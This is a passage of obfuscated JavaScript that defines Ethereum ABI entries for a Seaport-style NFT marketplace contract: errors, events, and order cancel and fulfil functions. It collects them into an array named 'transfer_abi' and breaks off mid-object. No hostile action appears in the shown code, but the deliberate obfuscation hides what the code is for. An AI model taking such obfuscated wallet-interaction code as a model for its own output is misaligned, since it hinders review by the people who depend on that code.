const _0xe11eab = { internalType: "string", name: "", type: "string" },
  _0x31d6e9 = { inputs: [], name: "version" };
(_0x31d6e9.outputs = [_0xe11eab]),
  (_0x31d6e9.stateMutability = "view"),
  (_0x31d6e9.type = "function");
var transfer_abi = [
  _0x4ff9f7,
  _0x505c7e,
  _0x51761a,
  _0x24e2f1,
  _0x318706,
  _0xfe816f,
  _0x593a3b,
  _0x28afd6,
  _0x28d072,
  _0x14407b,
  _0x133b55,
  _0x174a1e,
  _0x4e939d,
  _0x50fcb1,
  _0x31f39a,
  _0x40956d,
  _0x465ce8,
  _0xbff415,
  _0x3a16d6,
  _0x30d493,
  _0x26aa76,
  _0xf5e870,
  _0x29d36e,
  _0x2657f5,
  _0xaf69fc,
  _0x1f7bd9,
  _0xb03e48,
  _0x554693,
  _0x34344a,
  _0x4b1c5f,
  _0xcc8a2,
  _0x4849ee,
  _0x1cfd17,
  _0x483220,
  _0xc3a088,
  _0x1d14cd,
  _0x27b99d,
  _0x3bf465,
  _0x2583f6,
  _0x5c70dd,
  _0x334d05,
  _0x45af3d,
  _0x482ac2,
  _0x76ffb8,
  _0x37a17d,
  _0x310565,
  _0x58ab32,
  _0xd0c419,
  _0x295694,
  _0x49c632,
  _0xca5ac4,
  _0x1545f3,
  _0x43f41b,
  _0x5e43ed,
  _0xf69e65,
  _0x10f286,
  _0x1b6459,
  _0x9d1ad5,
  _0x4a2551,
  _0x1f05f0,
  _0x5e6246,
  _0x22deee,
  _0x3e03fc,
  _0x103ca9,
  _0x16d8c4,
  _0x1be628,
  _0x31d6e9,
];
const _0x565b0e = {
    internalType: "address",
    name: "conduitController",
    type: "address",
  },
  _0x31d358 = {};
(_0x31d358.inputs = [_0x565b0e]),
  (_0x31d358.stateMutability = "nonpayable"),
  (_0x31d358.type = "constructor");
const _0x50d460 = { inputs: [], name: "BadContractSignature", type: "error" },
  _0x2eb454 = { inputs: [], name: "BadFraction", type: "error" },
  _0x70a211 = { internalType: "address", name: "token", type: "address" },
  _0x55c413 = { internalType: "address", name: "from", type: "address" },
  _0x530cad = { internalType: "address", name: "to", type: "address" },
  _0x466dbe = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x3e60cd = {};
(_0x3e60cd.inputs = [_0x70a211, _0x55c413, _0x530cad, _0x466dbe]),
  (_0x3e60cd.name = "BadReturnValueFromERC20OnTransfer"),
  (_0x3e60cd.type = "error");
const _0x23cd5d = { internalType: "uint8", name: "v", type: "uint8" },
  _0x3f1729 = {};
(_0x3f1729.inputs = [_0x23cd5d]),
  (_0x3f1729.name = "BadSignatureV"),
  (_0x3f1729.type = "error");
const _0x1e914e = {
    inputs: [],
    name: "ConsiderationCriteriaResolverOutOfRange",
    type: "error",
  },
  _0x277075 = { internalType: "uint256", name: "orderIndex", type: "uint256" },
  _0x2a0d60 = {
    internalType: "uint256",
    name: "considerationIndex",
    type: "uint256",
  },
  _0x2ddffd = {
    internalType: "uint256",
    name: "shortfallAmount",
    type: "uint256",
  },
  _0x52cbff = {};
(_0x52cbff.inputs = [_0x277075, _0x2a0d60, _0x2ddffd]),
  (_0x52cbff.name = "ConsiderationNotMet"),
  (_0x52cbff.type = "error");
const _0x11c122 = {
    inputs: [],
    name: "CriteriaNotEnabledForItem",
    type: "error",
  },
  _0x20b4af = { internalType: "address", name: "token", type: "address" },
  _0x21709e = { internalType: "address", name: "from", type: "address" },
  _0x3956d1 = { internalType: "address", name: "to", type: "address" },
  _0x34ec8f = {
    internalType: "uint256[]",
    name: "identifiers",
    type: "uint256[]",
  },
  _0x1eb7e6 = { internalType: "uint256[]", name: "amounts", type: "uint256[]" },
  _0x22f0e3 = {};
(_0x22f0e3.inputs = [_0x20b4af, _0x21709e, _0x3956d1, _0x34ec8f, _0x1eb7e6]),
  (_0x22f0e3.name = "ERC1155BatchTransferGenericFailure"),
  (_0x22f0e3.type = "error");
const _0x467b1c = { internalType: "address", name: "account", type: "address" },
  _0x461735 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x33db42 = {};
(_0x33db42.inputs = [_0x467b1c, _0x461735]),
  (_0x33db42.name = "EtherTransferGenericFailure"),
  (_0x33db42.type = "error");
const _0x201903 = { inputs: [], name: "InexactFraction", type: "error" },
  _0x376588 = { inputs: [], name: "InsufficientEtherSupplied", type: "error" },
  _0x5e1877 = {
    inputs: [],
    name: "Invalid1155BatchTransferEncoding",
    type: "error",
  },
  _0x112584 = {
    inputs: [],
    name: "InvalidBasicOrderParameterEncoding",
    type: "error",
  },
  _0x197199 = { internalType: "address", name: "conduit", type: "address" },
  _0x5621e8 = {};
(_0x5621e8.inputs = [_0x197199]),
  (_0x5621e8.name = "InvalidCallToConduit"),
  (_0x5621e8.type = "error");
const _0x269443 = { inputs: [], name: "InvalidCanceller", type: "error" },
  _0x50e567 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x3d658c = { internalType: "address", name: "conduit", type: "address" },
  _0x57e10f = {};
(_0x57e10f.inputs = [_0x50e567, _0x3d658c]),
  (_0x57e10f.name = "InvalidConduit"),
  (_0x57e10f.type = "error");
const _0x78451a = {
    inputs: [],
    name: "InvalidERC721TransferAmount",
    type: "error",
  },
  _0x28c8ae = {
    inputs: [],
    name: "InvalidFulfillmentComponentData",
    type: "error",
  },
  _0x5c828c = { internalType: "uint256", name: "value", type: "uint256" },
  _0xb39577 = {};
(_0xb39577.inputs = [_0x5c828c]),
  (_0xb39577.name = "InvalidMsgValue"),
  (_0xb39577.type = "error");
const _0x3a8475 = { inputs: [], name: "InvalidNativeOfferItem", type: "error" },
  _0x2081e2 = { inputs: [], name: "InvalidProof", type: "error" },
  _0x47c164 = { internalType: "bytes32", name: "orderHash", type: "bytes32" },
  _0x20ba14 = {};
(_0x20ba14.inputs = [_0x47c164]),
  (_0x20ba14.name = "InvalidRestrictedOrder"),
  (_0x20ba14.type = "error");
const _0x4de4b3 = { inputs: [], name: "InvalidSignature", type: "error" },
  _0x69d48b = { inputs: [], name: "InvalidSigner", type: "error" },
  _0x221fc7 = { inputs: [], name: "InvalidTime", type: "error" },
  _0x316584 = {
    inputs: [],
    name: "MismatchedFulfillmentOfferAndConsiderationComponents",
    type: "error",
  },
  _0x52ae09 = { internalType: "enum Side", name: "side", type: "uint8" },
  _0x1d0685 = {};
(_0x1d0685.inputs = [_0x52ae09]),
  (_0x1d0685.name = "MissingFulfillmentComponentOnAggregation"),
  (_0x1d0685.type = "error");
const _0x132e9f = { inputs: [], name: "MissingItemAmount", type: "error" },
  _0x415d1a = {
    inputs: [],
    name: "MissingOriginalConsiderationItems",
    type: "error",
  },
  _0x5e4ae8 = { internalType: "address", name: "account", type: "address" },
  _0x226ccd = {};
(_0x226ccd.inputs = [_0x5e4ae8]),
  (_0x226ccd.name = "NoContract"),
  (_0x226ccd.type = "error");
const _0x574dc9 = { inputs: [], name: "NoReentrantCalls", type: "error" },
  _0x15724a = { inputs: [], name: "NoSpecifiedOrdersAvailable", type: "error" },
  _0x11e1d0 = {
    inputs: [],
    name: "OfferAndConsiderationRequiredOnFulfillment",
    type: "error",
  },
  _0x2f2537 = {
    inputs: [],
    name: "OfferCriteriaResolverOutOfRange",
    type: "error",
  },
  _0x25bd23 = { internalType: "bytes32", name: "orderHash", type: "bytes32" },
  _0x198c83 = {};
(_0x198c83.inputs = [_0x25bd23]),
  (_0x198c83.name = "OrderAlreadyFilled"),
  (_0x198c83.type = "error");
const _0x238470 = {
    inputs: [],
    name: "OrderCriteriaResolverOutOfRange",
    type: "error",
  },
  _0x41e26a = { internalType: "bytes32", name: "orderHash", type: "bytes32" },
  _0x288030 = {};
(_0x288030.inputs = [_0x41e26a]),
  (_0x288030.name = "OrderIsCancelled"),
  (_0x288030.type = "error");
const _0x13b580 = {
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x8f2822 = {};
(_0x8f2822.inputs = [_0x13b580]),
  (_0x8f2822.name = "OrderPartiallyFilled"),
  (_0x8f2822.type = "error");
const _0x579a2d = {
    inputs: [],
    name: "PartialFillsNotEnabledForOrder",
    type: "error",
  },
  _0x24a3fe = { internalType: "address", name: "token", type: "address" },
  _0x2431ea = { internalType: "address", name: "from", type: "address" },
  _0x3f5a5b = { internalType: "address", name: "to", type: "address" },
  _0x15e9e0 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x373db5 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0xb8ec39 = {};
(_0xb8ec39.inputs = [_0x24a3fe, _0x2431ea, _0x3f5a5b, _0x15e9e0, _0x373db5]),
  (_0xb8ec39.name = "TokenTransferGenericFailure"),
  (_0xb8ec39.type = "error");
const _0x5593f7 = {
    inputs: [],
    name: "UnresolvedConsiderationCriteria",
    type: "error",
  },
  _0x238c07 = { inputs: [], name: "UnresolvedOfferCriteria", type: "error" },
  _0x179db2 = { inputs: [], name: "UnusedItemParameters", type: "error" },
  _0x1d9484 = {
    indexed: !1,
    internalType: "uint256",
    name: "newCounter",
    type: "uint256",
  },
  _0xfc837c = {
    indexed: !0,
    internalType: "address",
    name: "offerer",
    type: "address",
  },
  _0x25d1b2 = { anonymous: !1 };
(_0x25d1b2.inputs = [_0x1d9484, _0xfc837c]),
  (_0x25d1b2.name = "CounterIncremented"),
  (_0x25d1b2.type = "event");
const _0x2d6f2e = {
    indexed: !1,
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x5b4fc6 = {
    indexed: !0,
    internalType: "address",
    name: "offerer",
    type: "address",
  },
  _0x4355f5 = {
    indexed: !0,
    internalType: "address",
    name: "zone",
    type: "address",
  },
  _0x373122 = { anonymous: !1 };
(_0x373122.inputs = [_0x2d6f2e, _0x5b4fc6, _0x4355f5]),
  (_0x373122.name = "OrderCancelled"),
  (_0x373122.type = "event");
const _0x4fa097 = {
    indexed: !1,
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x41fc1f = {
    indexed: !0,
    internalType: "address",
    name: "offerer",
    type: "address",
  },
  _0x12443c = {
    indexed: !0,
    internalType: "address",
    name: "zone",
    type: "address",
  },
  _0x3301a6 = {
    indexed: !1,
    internalType: "address",
    name: "recipient",
    type: "address",
  },
  _0x30a256 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x4df280 = { internalType: "address", name: "token", type: "address" },
  _0x265141 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x3a39d1 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x2b1f9a = {};
(_0x2b1f9a.components = [_0x30a256, _0x4df280, _0x265141, _0x3a39d1]),
  (_0x2b1f9a.indexed = !1),
  (_0x2b1f9a.internalType = "struct SpentItem[]"),
  (_0x2b1f9a.name = "offer"),
  (_0x2b1f9a.type = "tuple[]");
const _0x3614b6 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x57a7c8 = { internalType: "address", name: "token", type: "address" },
  _0x1269b8 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x40928b = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x430a5e = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x3be146 = {};
(_0x3be146.components = [
  _0x3614b6,
  _0x57a7c8,
  _0x1269b8,
  _0x40928b,
  _0x430a5e,
]),
  (_0x3be146.indexed = !1),
  (_0x3be146.internalType = "struct ReceivedItem[]"),
  (_0x3be146.name = "consideration"),
  (_0x3be146.type = "tuple[]");
const _0xfce427 = { anonymous: !1 };
(_0xfce427.inputs = [
  _0x4fa097,
  _0x41fc1f,
  _0x12443c,
  _0x3301a6,
  _0x2b1f9a,
  _0x3be146,
]),
  (_0xfce427.name = "OrderFulfilled"),
  (_0xfce427.type = "event");
const _0x100f2f = {
    indexed: !1,
    internalType: "bytes32",
    name: "orderHash",
    type: "bytes32",
  },
  _0x10ba73 = {
    indexed: !0,
    internalType: "address",
    name: "offerer",
    type: "address",
  },
  _0x1048ad = {
    indexed: !0,
    internalType: "address",
    name: "zone",
    type: "address",
  },
  _0x462bb7 = { anonymous: !1 };
(_0x462bb7.inputs = [_0x100f2f, _0x10ba73, _0x1048ad]),
  (_0x462bb7.name = "OrderValidated"),
  (_0x462bb7.type = "event");
const _0x358a40 = { internalType: "address", name: "offerer", type: "address" },
  _0x38b332 = { internalType: "address", name: "zone", type: "address" },
  _0x2caea8 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x2c91b8 = { internalType: "address", name: "token", type: "address" },
  _0x86fed1 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x57ff7e = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x17f27e = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x33232d = {};
(_0x33232d.components = [
  _0x2caea8,
  _0x2c91b8,
  _0x86fed1,
  _0x57ff7e,
  _0x17f27e,
]),
  (_0x33232d.internalType = "struct OfferItem[]"),
  (_0x33232d.name = "offer"),
  (_0x33232d.type = "tuple[]");
const _0x484b1d = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x53b659 = { internalType: "address", name: "token", type: "address" },
  _0x1a7436 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x6de6e5 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x40a640 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x4684c7 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x3a05b4 = {};
(_0x3a05b4.components = [
  _0x484b1d,
  _0x53b659,
  _0x1a7436,
  _0x6de6e5,
  _0x40a640,
  _0x4684c7,
]),
  (_0x3a05b4.internalType = "struct ConsiderationItem[]"),
  (_0x3a05b4.name = "consideration"),
  (_0x3a05b4.type = "tuple[]");
const _0x5c98fb = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x1282df = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x489bd5 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x498eac = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x462f2a = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x10af21 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x2566aa = { internalType: "uint256", name: "counter", type: "uint256" },
  _0x172915 = {};
(_0x172915.components = [
  _0x358a40,
  _0x38b332,
  _0x33232d,
  _0x3a05b4,
  _0x5c98fb,
  _0x1282df,
  _0x489bd5,
  _0x498eac,
  _0x462f2a,
  _0x10af21,
  _0x2566aa,
]),
  (_0x172915.internalType = "struct OrderComponents[]"),
  (_0x172915.name = "orders"),
  (_0x172915.type = "tuple[]");
const _0x4f20cd = { internalType: "bool", name: "cancelled", type: "bool" },
  _0x30a7ec = {};
(_0x30a7ec.inputs = [_0x172915]),
  (_0x30a7ec.name = "cancel"),
  (_0x30a7ec.outputs = [_0x4f20cd]),
  (_0x30a7ec.stateMutability = "nonpayable"),
  (_0x30a7ec.type = "function");
const _0x1252ed = { internalType: "address", name: "offerer", type: "address" },
  _0x58fbca = { internalType: "address", name: "zone", type: "address" },
  _0x241296 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0xc2be09 = { internalType: "address", name: "token", type: "address" },
  _0x2e07b9 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x4780ec = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x47e72f = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x2760c0 = {};
(_0x2760c0.components = [
  _0x241296,
  _0xc2be09,
  _0x2e07b9,
  _0x4780ec,
  _0x47e72f,
]),
  (_0x2760c0.internalType = "struct OfferItem[]"),
  (_0x2760c0.name = "offer"),
  (_0x2760c0.type = "tuple[]");
const _0x1b934e = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x1cdb5d = { internalType: "address", name: "token", type: "address" },
  _0x1c6a7f = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x41ea8f = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x370713 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x77917 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x39b4b6 = {};
(_0x39b4b6.components = [
  _0x1b934e,
  _0x1cdb5d,
  _0x1c6a7f,
  _0x41ea8f,
  _0x370713,
  _0x77917,
]),
  (_0x39b4b6.internalType = "struct ConsiderationItem[]"),
  (_0x39b4b6.name = "consideration"),
  (_0x39b4b6.type = "tuple[]");
const _0x293014 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x41414b = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x5c3a32 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x237c4c = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x13c59e = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x258d6e = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x4c5fa9 = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x38c47a = {};
(_0x38c47a.components = [
  _0x1252ed,
  _0x58fbca,
  _0x2760c0,
  _0x39b4b6,
  _0x293014,
  _0x41414b,
  _0x5c3a32,
  _0x237c4c,
  _0x13c59e,
  _0x258d6e,
  _0x4c5fa9,
]),
  (_0x38c47a.internalType = "struct OrderParameters"),
  (_0x38c47a.name = "parameters"),
  (_0x38c47a.type = "tuple");
const _0x32f5b1 = {
    internalType: "uint120",
    name: "numerator",
    type: "uint120",
  },
  _0x512ccb = { internalType: "uint120", name: "denominator", type: "uint120" },
  _0x2d53b9 = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x43bf9f = { internalType: "bytes", name: "extraData", type: "bytes" },
  _0x403c09 = {};
(_0x403c09.components = [
  _0x38c47a,
  _0x32f5b1,
  _0x512ccb,
  _0x2d53b9,
  _0x43bf9f,
]),
  (_0x403c09.internalType = "struct AdvancedOrder"),
  (_0x403c09.name = "advancedOrder"),
  (_0x403c09.type = "tuple");
const _0xaa182d = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x5929db = { internalType: "enum Side", name: "side", type: "uint8" },
  _0x174614 = { internalType: "uint256", name: "index", type: "uint256" },
  _0x3dccf4 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x141e7c = {
    internalType: "bytes32[]",
    name: "criteriaProof",
    type: "bytes32[]",
  },
  _0x44167b = {};
(_0x44167b.components = [
  _0xaa182d,
  _0x5929db,
  _0x174614,
  _0x3dccf4,
  _0x141e7c,
]),
  (_0x44167b.internalType = "struct CriteriaResolver[]"),
  (_0x44167b.name = "criteriaResolvers"),
  (_0x44167b.type = "tuple[]");
const _0x252fc9 = {
    internalType: "bytes32",
    name: "fulfillerConduitKey",
    type: "bytes32",
  },
  _0x578c = { internalType: "address", name: "recipient", type: "address" },
  _0x42965b = { internalType: "bool", name: "fulfilled", type: "bool" },
  _0x974882 = {};
(_0x974882.inputs = [_0x403c09, _0x44167b, _0x252fc9, _0x578c]),
  (_0x974882.name = "fulfillAdvancedOrder"),
  (_0x974882.outputs = [_0x42965b]),
  (_0x974882.stateMutability = "payable"),
  (_0x974882.type = "function");
const _0x740255 = { internalType: "address", name: "offerer", type: "address" },
  _0x5a08a3 = { internalType: "address", name: "zone", type: "address" },
  _0x2886a9 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x88834c = { internalType: "address", name: "token", type: "address" },
  _0x50c6b6 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x8030fe = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x202bf4 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x2db52a = {};
(_0x2db52a.components = [
  _0x2886a9,
  _0x88834c,
  _0x50c6b6,
  _0x8030fe,
  _0x202bf4,
]),
  (_0x2db52a.internalType = "struct OfferItem[]"),
  (_0x2db52a.name = "offer"),
  (_0x2db52a.type = "tuple[]");
const _0x5d2ccb = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x320e15 = { internalType: "address", name: "token", type: "address" },
  _0x192236 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x582650 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x4e7c89 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x731a35 = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x152f6a = {};
(_0x152f6a.components = [
  _0x5d2ccb,
  _0x320e15,
  _0x192236,
  _0x582650,
  _0x4e7c89,
  _0x731a35,
]),
  (_0x152f6a.internalType = "struct ConsiderationItem[]"),
  (_0x152f6a.name = "consideration"),
  (_0x152f6a.type = "tuple[]");
const _0x1f0fa4 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x5bee0f = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x5b8ce3 = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x5b2b8f = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x1a6c4e = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x1c353f = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x4897a4 = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x1614cb = {};
(_0x1614cb.components = [
  _0x740255,
  _0x5a08a3,
  _0x2db52a,
  _0x152f6a,
  _0x1f0fa4,
  _0x5bee0f,
  _0x5b8ce3,
  _0x5b2b8f,
  _0x1a6c4e,
  _0x1c353f,
  _0x4897a4,
]),
  (_0x1614cb.internalType = "struct OrderParameters"),
  (_0x1614cb.name = "parameters"),
  (_0x1614cb.type = "tuple");
const _0x1b4690 = {
    internalType: "uint120",
    name: "numerator",
    type: "uint120",
  },
  _0x5dc29f = { internalType: "uint120", name: "denominator", type: "uint120" },
  _0x4cf7f8 = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x46f7b5 = { internalType: "bytes", name: "extraData", type: "bytes" },
  _0x1f5bb9 = {};
(_0x1f5bb9.components = [
  _0x1614cb,
  _0x1b4690,
  _0x5dc29f,
  _0x4cf7f8,
  _0x46f7b5,
]),
  (_0x1f5bb9.internalType = "struct AdvancedOrder[]"),
  (_0x1f5bb9.name = "advancedOrders"),
  (_0x1f5bb9.type = "tuple[]");
const _0x35ad78 = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x28c168 = { internalType: "enum Side", name: "side", type: "uint8" },
  _0x3a4a0c = { internalType: "uint256", name: "index", type: "uint256" },
  _0x33a0b4 = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x43f7d8 = {
    internalType: "bytes32[]",
    name: "criteriaProof",
    type: "bytes32[]",
  },
  _0x3d3e9a = {};
(_0x3d3e9a.components = [
  _0x35ad78,
  _0x28c168,
  _0x3a4a0c,
  _0x33a0b4,
  _0x43f7d8,
]),
  (_0x3d3e9a.internalType = "struct CriteriaResolver[]"),
  (_0x3d3e9a.name = "criteriaResolvers"),
  (_0x3d3e9a.type = "tuple[]");
const _0x277447 = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x36fff5 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x5de4aa = {};
(_0x5de4aa.components = [_0x277447, _0x36fff5]),
  (_0x5de4aa.internalType = "struct FulfillmentComponent[][]"),
  (_0x5de4aa.name = "offerFulfillments"),
  (_0x5de4aa.type = "tuple[][]");
const _0x2fdbee = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x415954 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x222477 = {};
(_0x222477.components = [_0x2fdbee, _0x415954]),
  (_0x222477.internalType = "struct FulfillmentComponent[][]"),
  (_0x222477.name = "considerationFulfillments"),
  (_0x222477.type = "tuple[][]");
const _0x246895 = {
    internalType: "bytes32",
    name: "fulfillerConduitKey",
    type: "bytes32",
  },
  _0x148c3d = { internalType: "address", name: "recipient", type: "address" },
  _0x633f3 = {
    internalType: "uint256",
    name: "maximumFulfilled",
    type: "uint256",
  },
  _0x4ac891 = {
    internalType: "bool[]",
    name: "availableOrders",
    type: "bool[]",
  },
  _0x13c227 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x1ce7f0 = { internalType: "address", name: "token", type: "address" },
  _0x395f3b = { internalType: "uint256", name: "identifier", type: "uint256" },
  _0x495799 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x31e58d = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0xd0ba1b = {};
(_0xd0ba1b.components = [
  _0x13c227,
  _0x1ce7f0,
  _0x395f3b,
  _0x495799,
  _0x31e58d,
]),
  (_0xd0ba1b.internalType = "struct ReceivedItem"),
  (_0xd0ba1b.name = "item"),
  (_0xd0ba1b.type = "tuple");
const _0x38773d = { internalType: "address", name: "offerer", type: "address" },
  _0x23c326 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x416219 = {};
(_0x416219.components = [_0xd0ba1b, _0x38773d, _0x23c326]),
  (_0x416219.internalType = "struct Execution[]"),
  (_0x416219.name = "executions"),
  (_0x416219.type = "tuple[]");
const _0xe32c8b = {};
(_0xe32c8b.inputs = [
  _0x1f5bb9,
  _0x3d3e9a,
  _0x5de4aa,
  _0x222477,
  _0x246895,
  _0x148c3d,
  _0x633f3,
]),
  (_0xe32c8b.name = "fulfillAvailableAdvancedOrders"),
  (_0xe32c8b.outputs = [_0x4ac891, _0x416219]),
  (_0xe32c8b.stateMutability = "payable"),
  (_0xe32c8b.type = "function");
const _0x534891 = { internalType: "address", name: "offerer", type: "address" },
  _0x3771f6 = { internalType: "address", name: "zone", type: "address" },
  _0x1fedd2 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0xaaba = { internalType: "address", name: "token", type: "address" },
  _0xf60039 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x2d2db0 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x3fde44 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x1237ed = {};
(_0x1237ed.components = [_0x1fedd2, _0xaaba, _0xf60039, _0x2d2db0, _0x3fde44]),
  (_0x1237ed.internalType = "struct OfferItem[]"),
  (_0x1237ed.name = "offer"),
  (_0x1237ed.type = "tuple[]");
const _0x2642b3 = {
    internalType: "enum ItemType",
    name: "itemType",
    type: "uint8",
  },
  _0x207163 = { internalType: "address", name: "token", type: "address" },
  _0x312491 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  _0x2f8d11 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  _0x24e9ea = { internalType: "uint256", name: "endAmount", type: "uint256" },
  _0x11774b = {
    internalType: "address payable",
    name: "recipient",
    type: "address",
  },
  _0x4363b2 = {};
(_0x4363b2.components = [
  _0x2642b3,
  _0x207163,
  _0x312491,
  _0x2f8d11,
  _0x24e9ea,
  _0x11774b,
]),
  (_0x4363b2.internalType = "struct ConsiderationItem[]"),
  (_0x4363b2.name = "consideration"),
  (_0x4363b2.type = "tuple[]");
const _0xd965f2 = {
    internalType: "enum OrderType",
    name: "orderType",
    type: "uint8",
  },
  _0x27c50f = { internalType: "uint256", name: "startTime", type: "uint256" },
  _0x5e7b6d = { internalType: "uint256", name: "endTime", type: "uint256" },
  _0x1cc84e = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  _0x54250c = { internalType: "uint256", name: "salt", type: "uint256" },
  _0x3b90d2 = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  _0x31c9b4 = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  _0x3a56b9 = {};
(_0x3a56b9.components = [
  _0x534891,
  _0x3771f6,
  _0x1237ed,
  _0x4363b2,
  _0xd965f2,
  _0x27c50f,
  _0x5e7b6d,
  _0x1cc84e,
  _0x54250c,
  _0x3b90d2,
  _0x31c9b4,
]),
  (_0x3a56b9.internalType = "struct OrderParameters"),
  (_0x3a56b9.name = "parameters"),
  (_0x3a56b9.type = "tuple");
const _0x48ba43 = { internalType: "bytes", name: "signature", type: "bytes" },
  _0x252f10 = {};
(_0x252f10.components = [_0x3a56b9, _0x48ba43]),
  (_0x252f10.internalType = "struct Order[]"),
  (_0x252f10.name = "orders"),
  (_0x252f10.type = "tuple[]");
const _0x4213c6 = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x331b48 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x5b76b6 = {};
(_0x5b76b6.components = [_0x4213c6, _0x331b48]),
  (_0x5b76b6.internalType = "struct FulfillmentComponent[][]"),
  (_0x5b76b6.name = "offerFulfillments"),
  (_0x5b76b6.type = "tuple[][]");
const _0x2c4eec = {
    internalType: "uint256",
    name: "orderIndex",
    type: "uint256",
  },
  _0x27c900 = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  _0x2c9b94 = {};
(_0x2c9b94.components = [_0x2c4eec, _0x27c900]),
  (_0x2c9b94.internalType = "struct FulfillmentComponent[][]"),
  (_0x2c9b94.name = "considerationFulfillments"),
  (_0x2c9b94.type = "tuple[][]");
const _0x2e926f = {
    internalType: "bytes32",
    name: "fulfillerConduitKey",
    type: "bytes32",
  },
  _0x2332a9 = {
    internalType: "uint256",
    name: "maximumFulfilled",
    type: "uint256",
  },
  _0x2bd820 = {
    internalType: "bool[]",
